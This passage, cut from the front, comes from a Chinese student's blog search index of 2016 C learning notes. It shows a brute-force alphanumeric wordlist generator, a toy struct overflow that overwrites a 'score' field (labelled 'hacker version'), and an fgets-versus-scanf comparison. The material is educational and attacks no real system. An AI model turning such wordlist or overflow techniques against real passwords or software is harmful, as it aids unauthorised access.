class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> b[<span class=\"number\">63</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">data</span> <span class=\"title\">c</span>=&#123;</span><span class=\"string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"</span>&#125;;</span><br><span class=\"line\"><span class=\"keyword\">int</span> a,i,j,k,l;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"请输入1-4来选择您想要对应尾数的字典程序\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>,&amp;a);</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"生成的字典为\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a&lt;<span class=\"number\">1</span>||a&gt;<span class=\"number\">4</span>)</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"你输入的数字不符合要求\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">switch</span>(a)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:dir1(a);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:dir2(a);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:dir3(a);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:dir4(a);<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dir1(<span class=\"keyword\">int</span> a)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">62</span>;i++)</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%c \"</span>,c.b[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dir2(<span class=\"keyword\">int</span> a)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">62</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">62</span>;j++)<span class=\"built_in\">printf</span>(<span class=\"string\">\"%c%c  \"</span>,c.b[i],c.b[j]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dir3(<span class=\"keyword\">int</span> a)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">62</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">62</span>;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(k=<span class=\"number\">0</span>;k&lt;<span class=\"number\">62</span>;k++)</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%c%c%c \"</span>,c.b[i],c.b[j],c.b[k]);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dir4(<span class=\"keyword\">int</span> a)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">62</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;<span class=\"number\">62</span>;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(k=<span class=\"number\">0</span>;k&lt;<span class=\"number\">62</span>;k++)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span>(l=<span class=\"number\">0</span>;l&lt;<span class=\"number\">62</span>;l++)</span><br><span class=\"line\">\t\t\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%c%c%c%c \"</span>,c.b[i],c.b[j],c.b[k],c.b[l]);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 仍然沿用V1.0的嵌套循环法，不过加入了结构体</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"V3-0（有待修改）\"><a href=\"#V3-0（有待修改）\" class=\"headerlink\" title=\"V3.0（有待修改）\"></a>V3.0（有待修改）</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"stdio.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"math.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"string.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">char</span> *opt[]=&#123;<span class=\"string\">\"0123456789\"</span>,<span class=\"string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"</span>,<span class=\"string\">\"abcdefghijklmnopqrstuvwxyz\"</span>&#125;;</span><br><span class=\"line\"><span class=\"keyword\">char</span> source[<span class=\"number\">63</span>]=&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"keyword\">int</span> o=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">fun</span><span class=\"params\">(<span class=\"keyword\">int</span> b,<span class=\"keyword\">int</span> g)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">option</span><span class=\"params\">(<span class=\"keyword\">int</span> a)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span>                                       <span class=\"comment\">//主函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a,b;</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"字典程序选项如下：\\n1.纯数字\\n2.纯小写字母\\n3.纯大写字母\\n4.数字+小写字母\\n5.数字+大写字母\\n6.大小写字母混合\\n7.数字+字母\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"请输入字典类型和位数 (注意中间用空格隔开~) \"</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>,&amp;a,&amp;b);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a&lt;<span class=\"number\">1</span>||a&gt;<span class=\"number\">7</span>)</span><br><span class=\"line\">\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"您输入了错误的数字，请关闭程序再重新进入\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\toption(a);</span><br><span class=\"line\">\t\tfun(o,b);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">option</span><span class=\"params\">(<span class=\"keyword\">int</span> a)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> b;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(a)                                     <span class=\"comment\">//匹配选项</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">1</span>:<span class=\"built_in\">strcpy</span>(source,opt[<span class=\"number\">0</span>]);b=<span class=\"number\">10</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">2</span>:<span class=\"built_in\">strcpy</span>(source,opt[<span class=\"number\">1</span>]);b=<span class=\"number\">26</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">3</span>:<span class=\"built_in\">strcpy</span>(source,opt[<span class=\"number\">2</span>]);b=<span class=\"number\">26</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">4</span>:<span class=\"built_in\">strcpy</span>(source,opt[<span class=\"number\">0</span>]);<span class=\"built_in\">strcat</span>(source,opt[<span class=\"number\">1</span>]);b=<span class=\"number\">36</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">5</span>:<span class=\"built_in\">strcpy</span>(source,opt[<span class=\"number\">1</span>]);<span class=\"built_in\">strcat</span>(source,opt[<span class=\"number\">2</span>]);b=<span class=\"number\">52</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">6</span>:<span class=\"built_in\">strcpy</span>(source,opt[<span class=\"number\">0</span>]);<span class=\"built_in\">strcat</span>(source,opt[<span class=\"number\">2</span>]);b=<span class=\"number\">36</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"number\">7</span>:<span class=\"built_in\">strcpy</span>(source,opt[<span class=\"number\">0</span>]);<span class=\"built_in\">strcat</span>(source,opt[<span class=\"number\">1</span>]);<span class=\"built_in\">strcat</span>(source,opt[<span class=\"number\">2</span>]);b=<span class=\"number\">62</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\to=b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">fun</span><span class=\"params\">(<span class=\"keyword\">int</span> b,<span class=\"keyword\">int</span> g)</span>                             <span class=\"comment\">//功能函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> c,d,f;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[<span class=\"number\">1000</span>]=&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(c=<span class=\"number\">0</span>;c&lt;<span class=\"built_in\">pow</span>(b,g);c++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(d=<span class=\"number\">0</span>,f=c;d&lt;g;d++,f=f/<span class=\"number\">62</span>)</span><br><span class=\"line\">\t\t\ta[d]=source[f%<span class=\"number\">62</span>];</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\t\"</span>,strrev(a));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image001-1586099547382.png\" alt=\"img\"></p>\n<p><img src=\"clip_image002-1586099547382.png\" alt=\"img\"></p>\n<h1 id=\"修改成绩（数组溢出）【2016-1-5】\"><a href=\"#修改成绩（数组溢出）【2016-1-5】\" class=\"headerlink\" title=\"修改成绩（数组溢出）【2016.1.5】\"></a>修改成绩（数组溢出）【2016.1.5】</h1><h2 id=\"学渣版\"><a href=\"#学渣版\" class=\"headerlink\" title=\"学渣版\"></a>学渣版</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"stdio.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"string.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">student</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> age;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> name[<span class=\"number\">9</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> score;</span><br><span class=\"line\">&#125;loser;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> name[]=<span class=\"string\">\"aaaaaaa d\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">9</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tloser.name[i]=name[i];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"学渣的分数为：%d\\n\"</span>,loser.score);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,loser.name);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"学霸版\"><a href=\"#学霸版\" class=\"headerlink\" title=\"学霸版\"></a>学霸版</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"stdio.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"string.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">student</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> age;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> name[<span class=\"number\">8</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> test;</span><br><span class=\"line\">&#125;hacker;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> name[]=<span class=\"string\">\"aaaaaaa d\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>,j=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">9</span>;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\thacker.name[i]=name[i];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\thacker.test=j;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"黑客的分数为：%d\\n\"</span>,hacker.test);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>,hacker.name);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"fgets函数【2016-1-7】\"><a href=\"#fgets函数【2016-1-7】\" class=\"headerlink\" title=\"fgets函数【2016.1.7】\"></a>fgets函数【2016.1.7】</h1><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"stdio.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"string\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> pro[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"please enter a project:\"</span>);</span><br><span class=\"line\">\tfgets(pro,<span class=\"keyword\">sizeof</span>(pro),<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">\tpro[<span class=\"built_in\">strlen</span>(pro)<span class=\"number\">-1</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Is %s your favorite project?\\n\"</span>,pro);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>fgets（）强行限制用户输入字符串的长度，保证不会越界。</li>\n<li>scanf（）允许输入结构化数据，而fgets（）只能输入一个字符串，且遇到换行符就停止。</li>\n<li>scanf（）不能读取带空格的字符串，而fgets（）能读取整个字符串。</li>\n</ol>\n<h2 id=\"因此\"><a href=\"#因此\" class=\"headerlink\" title=\"因此\"></a>因此</h2><p>需要输入有多个字段构成的结构化数据—-&gt;scanf()</p>\n<p>想要输入一个非结构化的字符串—-&gt;fgets()</p>\n","categories":["技术"],"tags":["c"]},{"title":"about","url":"https://littleghost2016.github.io/about/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"https://littleghost2016.github.io/category/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"https://littleghost2016.github.io/link/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"https://littleghost2016.github.io/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"https://littleghost2016.github.io/tag/index.html","content":"","categories":[],"tags":[]}]